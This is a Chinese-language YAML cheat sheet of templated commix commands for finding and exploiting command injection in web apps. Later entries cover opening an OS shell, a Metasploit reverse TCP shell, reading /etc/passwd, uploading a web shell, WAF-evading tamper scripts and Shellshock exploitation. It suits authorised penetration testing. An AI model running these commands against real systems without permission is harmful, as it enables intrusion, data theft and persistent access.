tool: commix
tags: [web, security, pentest, exploitation, vulnerability-scanner, command-injection]

actions:
# === TARGETING & BASIC SCANNING ===

 - title: commix - 基本 GET 请求扫描
   desc: |
     对目标 URL 执行基本扫描，以识别 GET 参数中的命令注入漏洞。
     除非另行指定，工具会自动测试所有可用参数，并使用基于结果的注入和盲注等多种技术。
   command: "commix --url {{url}}"

 - title: commix - 使用 POST 数据进行扫描
   desc: |
     测试 POST 请求正文中的命令注入。
     应按浏览器实际发送的格式提供数据字符串，并使用 INJECT_HERE 字符串标记要测试的具体参数。
   command: "commix --url {{url}} --data='{{parameter}}=INJECT_HERE'"

 - title: commix - 使用原始请求文件扫描
   desc: |
     从文本文件加载完整的 HTTP 请求，该文件通常从 Burp Suite 等代理导出。
     对于包含特定请求头、Cookie 和格式的复杂请求，强烈推荐使用此方法。
   command: "commix -r {{request_file|request.txt}}"

# === REQUEST CUSTOMIZATION ===

 - title: commix - 携带 Cookie 和请求头扫描
   desc: |
     支持对需要认证或特定会话 Cookie 的页面进行测试。
     也可提供自定义 HTTP 请求头（如 X-Forwarded-For）来测试日志或请求头中的注入。
   command: "commix --url {{url}} --cookie='{{cookie|PHPSESSID=12345}}' --header='{{header|X-Forwarded-For: 127.0.0.1}}'"

 - title: commix - 通过代理扫描
   desc: |
     将所有 Commix 流量经由指定代理服务器（如 Burp Suite 或 Tor）转发。
     格式应为 protocol://address:port（如 http://127.0.0.1:8080），使用 --tor 标志可快捷走本地 Tor 服务。
   command: "commix --url {{url}} --proxy={{proxy|http://127.0.0.1:8080}}"

# === ENUMERATION ===

 - title: commix - 系统信息枚举
   desc: |
     在找到注入点后，尝试收集底层操作系统的详细信息。
     可获取当前用户、主机名、内核版本和架构等信息，用于后续利用规划。
   command: "commix --url {{url}} --sys-info"

 - title: commix - 检查 root/管理员权限
   desc: |
     检查目标系统上的当前用户是否具有管理员或 root 级权限。
     这是渗透测试中确定漏洞潜在影响的关键步骤，逻辑针对 Linux（is-root）和 Windows（is-admin）分别适配。
   command: "commix --url {{url}} --is-root"

# === EXPLOITATION & SHELLS ===

 - title: commix - 进入伪 Shell
   desc: |
     注入成功后，在目标系统上提供交互式命令行接口。
     该伪 Shell 虽非完整 TTY，但可将注入包装为提示符，模拟终端体验。
   command: "commix --url {{url}} --os-shell"

 - title: commix - 通过 Metasploit 建立反向 Shell
   desc: |
     使用 Metasploit Framework 自动创建并执行反向 Shell 载荷。
     本机需安装 Metasploit，工具会尝试绕过各种限制以建立回到监听端的稳定连接。
   command: "commix --url {{url}} --reverse-tcp"

# === FILE OPERATIONS ===

 - title: commix - 读取远程文件
   desc: |
     利用注入漏洞尝试读取目标文件系统中特定文件的内容。
     对窃取配置文件、源码或 /etc/passwd 等敏感数据非常有效，需提供文件的绝对路径。
   command: "commix --url {{url}} --file-read={{remote_file|/etc/passwd}}"

 - title: commix - 上传本地文件到主机
   desc: |
     将本地文件上传到目标服务器的指定目录。
     需同时指定本地源路径和远程目标路径，可用于上传 Web Shell、脚本等后渗透工具。
   command: "commix --url {{url}} --file-upload={{local_file}} --file-dest={{remote_path|/tmp/shell.php}}"

# === ADVANCED DETECTION & EVASION ===

 - title: commix - 高级检测级别与混淆
   desc: |
     通过设置更高级别（最高 3）进行更详尽的注入尝试，并应用混淆脚本修改载荷以绕过 WAF 或 IPS 过滤。
     级别 3 包含更耗时且更具侵入性的检查，可发现隐藏漏洞。
   command: "commix --url {{url}} --level=3 --tamper={{tamper_script|base64encode}}"

 - title: commix - 利用 Shellshock
   desc: |
     专门针对 Web 应用中的 Shellshock（CVE-2014-6271）漏洞。
     该模块通过 HTTP 请求头注入载荷，对运行易受攻击 Bash 版本的旧版 CGI Web 服务器尤为有效。
   command: "commix --url {{url}} --shellshock"
